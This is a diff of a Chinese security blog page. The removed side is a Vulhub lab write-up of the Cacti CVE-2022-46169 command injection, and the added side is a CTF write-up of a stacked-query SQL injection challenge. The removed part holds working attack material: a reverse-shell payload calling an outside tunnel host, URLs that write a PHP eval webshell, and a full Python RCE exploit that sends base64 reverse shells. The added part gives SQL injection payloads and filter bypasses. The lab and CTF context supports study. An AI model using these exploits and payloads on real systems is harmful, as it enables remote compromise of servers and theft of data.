@@ -17,7 +17,7 @@
     <meta name="keywords" content="G00dddd">
 
 
-<title>11.Cacti | G00d`s Blog</title>
+<title>CTF-强网杯2019随便注 | G00d`s Blog</title>
 
 
 
@@ -325,7 +325,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">11.Cacti</h1>
+            <h1 class="post-title">CTF-强网杯2019随便注</h1>
             
                 <div class="post-meta">
                     
@@ -334,14 +334,14 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:22:17</a>
+                        Date: <a href="#">十一月 23, 2024&nbsp;&nbsp;0:18:48</a>
                         </span>
                     
                     
                         <span class="post-category">
                     Category:
                             
-                                <a href="../categories/Vulhub/">Vulhub</a>
+                                <a href="../categories/CTF/">CTF</a>
                             
                         </span>
                     
@@ -350,89 +350,46 @@
         </header>
 
         <div class="post-content">
-            <p>Cacti</p>
-<p>前台命令注入漏洞（CVE-2022-46169）</p>
-<p>Cacti是一个服务器监控与管理平台。基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具.在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。</p>
-<p>由于remote_agent.php文件存在验证缺陷，未经身份验证的攻击者通过设置HTTP_开头变量的值为 Cacti的服务器主机名来实现身份验证绕过，之后控制get_nfilter_request_var()函数中的检索参数$poller_id，当poller_item设置为POLLER_ACTION_SCRIPT_PHP时，导致proc_open()函数被触发，最终实现在目标系统上任意命令执行。</p>
-<p>#漏洞payload</p>
-<p>remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;`&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;6.tcp.cpolar.cn&#x2F;13523 1&amp;&gt;0`</p>
-<p>X-Forwarded-For:127.0.0.1</p>
-<p>这个漏洞的利用需要Cacti应用中至少存在一个类似是`POLLER_ACTION_SCRIPT_PHP`的采集器。所以，我们在Cacti后台首页创建一个新的Graph：</p>
-<p><img src="/11-cacti//1.png" alt="1"></p>
-<p><img src="/11-cacti//2.png" alt="2"></p>
-<p>创建成功之后用payload即可反弹shell,或者写入webshell</p>
-<p><img src="/11-cacti//3.png" alt="3"></p>
-<p><a target="_blank" rel="noopener" href="http://localhost:8080/remote_agent.php?action=polldata&local_data_ids%5C%5B0%5C%5D=6&host_id=1&poller_id=%5C%60touch+/tmp/success%5C%60">http://localhost:8080/remote_agent.php?action=polldata&amp;local_data_ids\[0\]=6&amp;host_id=1&amp;poller_id=\`touch+/tmp/success\`</a></p>
-<p><a target="_blank" rel="noopener" href="http://localhost:8080/remote_agent.php?action=polldata&local_data_ids%5C%5B0%5C%5D=6&host_id=1&poller_id=%5C%60echo%20%20%27%3C?php%20@eval($_REQUEST%5B%22cmd%22%5D);?%3E%27%20%3Eshell.php%5C%60">http://localhost:8080/remote_agent.php?action=polldata&amp;local_data_ids\[0\]=6&amp;host_id=1&amp;poller_id=\`echo%20%20&#39;%3C%3Fphp%20%40eval(%24_REQUEST%5B%22cmd%22%5D)%3B%3F%3E&#39;%20%3Eshell.php\`</a></p>
-<p>或者直接用POC链</p>
-<p># <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/51166">https://www.exploit-db.com/exploits/51166</a></p>
-<p># Exploit Title: Cacti v1.2.22 - Remote Command Execution (RCE)</p>
-<p># Exploit Author: Riadh BOUCHAHOUA</p>
-<p># Discovery Date: 2022-12-08</p>
-<p># Vendor Homepage: <a target="_blank" rel="noopener" href="https://www.cacti.net/">https://www.cacti.net/</a></p>
-<p># Software Links : <a target="_blank" rel="noopener" href="https://github.com/Cacti/cacti">https://github.com/Cacti/cacti</a></p>
-<p># Tested Version: 1.2.2x &lt;&#x3D; 1.2.22</p>
-<p># CVE: CVE-2022-46169</p>
-<p># Tested on OS: Debian 10&#x2F;11</p>
-<p># !&#x2F;usr&#x2F;bin&#x2F;env python3</p>
-<p>import random</p>
-<p>import sys</p>
-<p>import httpx, urllib</p>
-<p>class Exploit:</p>
-<p>    def __init__(self, url, proxy&#x3D;None, rs_host&#x3D;””, rs_port&#x3D;””):</p>
-<p>        self.url &#x3D; url</p>
-<p>        self.session &#x3D; httpx.Client(headers&#x3D;{“User-Agent”: self.random_user_agent()}, verify&#x3D;False, proxies&#x3D;proxy)</p>
-<p>        self.rs_host &#x3D; rs_host</p>
-<p>        self.rs_port &#x3D; rs_port</p>
-<p>    def exploit(self):</p>
-<p>        # cacti local ip from the url for the X-Forwarded-For header</p>
-<p>        # local_cacti_ip  &#x3D; self.url.split(“&#x2F;&#x2F;“)[1].split(“&#x2F;“)[0]</p>
-<p>        local_cacti_ip &#x3D; ‘127.0.0.1’</p>
-<p>        headers &#x3D; {</p>
-<p>            ‘X-Forwarded-For’: f’{local_cacti_ip}’</p>
-<p>        }</p>
-<p>        revshell &#x3D; f”bash -c ‘exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;{self.rs_host}&#x2F;{self.rs_port} &lt;&amp;1’”</p>
-<p>        import base64</p>
-<p>        b64_revshell &#x3D; base64.b64encode(revshell.encode()).decode()</p>
-<p>        payload &#x3D; f”;echo {b64_revshell} | base64 -d | bash -“</p>
-<p>        payload &#x3D; urllib.parse.quote(payload)</p>
-<p>        urls &#x3D; []</p>
-<p>        # Adjust the range to fit your needs ( wider the range, longer the script will take to run the more success you will have achieving a reverse shell)</p>
-<p>        for host_id in range(1, 100):</p>
-<p>            for local_data_ids in range(1, 100):</p>
-<p>                urls.append(</p>
-<p>                    f”{self.url}&#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[]&#x3D;{local_data_ids}&amp;host_id&#x3D;{host_id}&amp;poller_id&#x3D;1{payload}”)</p>
-<p>        for url in urls:</p>
-<p>            try:</p>
-<p>                print(“[*]try: {}”.format(urllib.parse.unquote(url)))</p>
-<p>                r &#x3D; self.session.get(url, headers&#x3D;headers)</p>
-<p>                print(f”{r.status_code} - {r.text}”)</p>
-<p>            except Exception as e:</p>
-<p>                print(e)</p>
-<p>                sys.exit()</p>
-<p>        pass</p>
-<p>    def random_user_agent(self):</p>
-<p>        ua_list &#x3D; [</p>
-<p>            “Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.124 Safari&#x2F;537.36”,</p>
-<p>            “Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko&#x2F;20100101 Firefox&#x2F;89.0”,</p>
-<p>        ]</p>
-<p>        return random.choice(ua_list)</p>
-<p>def parse_args():</p>
-<p>    import argparse</p>
-<p>    argparser &#x3D; argparse.ArgumentParser()</p>
-<p>    argparser.add_argument(“-u”, “–url”, help&#x3D;”Target URL (e.g. <a target="_blank" rel="noopener" href="http://192.168.1.100/cacti">http://192.168.1.100/cacti</a>)”)</p>
-<p>    argparser.add_argument(“-p”, “–remote_port”, help&#x3D;”reverse shell port to connect to”, required&#x3D;True)</p>
-<p>    argparser.add_argument(“-i”, “–remote_ip”, help&#x3D;”reverse shell IP to connect to”, required&#x3D;True)</p>
-<p>    return argparser.parse_args()</p>
-<p>def main() -&gt; None:</p>
-<p>    # Open a nc listener (rs_host+rs_port) and run the script against a CACTI server with its LOCAL IP URL</p>
-<p>    args &#x3D; parse_args()</p>
-<p>    e &#x3D; Exploit(args.url, rs_host&#x3D;args.remote_ip, rs_port&#x3D;args.remote_port)</p>
-<p>    e.exploit()</p>
-<p>if __name__ &#x3D;&#x3D; “__main__“:</p>
-<p>    main()</p>
-<p>python Cacti.py -u http:&#x2F;&#x2F;靶机ip:8080 -i 接收shell的ip -p 15141</p>
-<p>这就直接反弹shell了</p>
+            <p>CTF-强网杯2019随便注</p>
+<p>[强网杯 2019]随便注</p>
+<p>尝试语句闭合方式，输入1、1’、1’#判断，结果语句应该为单引号闭合。</p>
+<p>再判断列1’ order by1,2,3…–+，发现到3时报错，所以列数位为2。</p>
+<p>然后尝试联合注入，1’ union select 1,databases()# 。返回过滤提示。</p>
+<p>Return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);</p>
+<p>把select禁用了</p>
+<p>转换大小写之后发现也不行,查询后multi_query()可以执行一条或多条sql语句</p>
+<p>爆数据库 1’;show databases;#</p>
+<p><img src="/ctf-%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8//1.png" alt="1"></p>
+<p>数据库有了</p>
+<p>查当前数据库的数据表1’;show tables;#</p>
+<p><img src="/ctf-%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8//2.png" alt="2"></p>
+<p>1’;show columns from words;# 查看words表的字段</p>
+<p>1’;show columns from <code>1919810931114514</code>;# 查看这个表的字段</p>
+<p>当表名为数字时，需要用反引号  </p>
+<p>都没有爆出flag,我考虑看一下其他数据库1’;show database supersqli# 只有hahaha这个表,也没有信息,只好找其他办法,这时候重新回到前面查的words表和那个数字的表</p>
+<p>这里有3种处理方法</p>
+<p>第一种：可以进行二进制编码来绕过被过滤的关键字</p>
+<p>将select * from 1919810931114514进行16进制编码</p>
+<p>1’;SeT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</p>
+<p>解析：</p>
+<p>prepare…from…是预处理语句，会进行编码转换。</p>
+<p>execute用来执行由SQLPrepare创建的SQL语句。</p>
+<p>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</p>
+<p>第二种：重名名绕过（可利用alter语句与rename语句）</p>
+<p>1’; rename table words to word1; rename table <code>1919810931114514</code> to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</p>
+<p>解析：</p>
+<p>通过 rename 先把 words 表改名为其他的表名。</p>
+<p>把 1919810931114514 表的名字改为 words 。</p>
+<p>给新 words 表添加新的列名 id ,并建立相关的约束。</p>
+<p>将 flag 改名为 data 。</p>
+<p>第三种：handler语句代替select查询</p>
+<p>1’; handler <code>1919810931114514</code> open as <code>a</code>; handler <code>a</code> read next;#</p>
+<p>解析加扩展：</p>
+<p>handler <code>1919810931114514</code> open as <code>a</code></p>
+<p>#指定数据表进行载入并将返回句柄重命名</p>
+<p>handler <code>a</code> read first; #读取指定表&#x2F;句柄的首行数据</p>
+<p>handler <code>a</code> read next; #读取指定表&#x2F;句柄的下一行数据</p>
+<p>handler yunensec close; #关闭句柄</p>
 
         </div>
 
@@ -456,7 +413,7 @@
                 <span class="tag">
                     
                     
-                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                        <a href="../tags/%E5%AD%A6%E4%B9%A0/"># 学习</a>
                     
                         
                 </span>
@@ -469,10 +426,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="../12-celery/">12.Celery</a>
             
-            
-            <a class="next" rel="next" href="../10-bashshellshock/">10.BashShellshock</a>
+            <a class="next" rel="next" href="../ctf-%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy-tornado1/">CTF-[护网杯2018]easy_tornado1</a>
             
         </section>
 
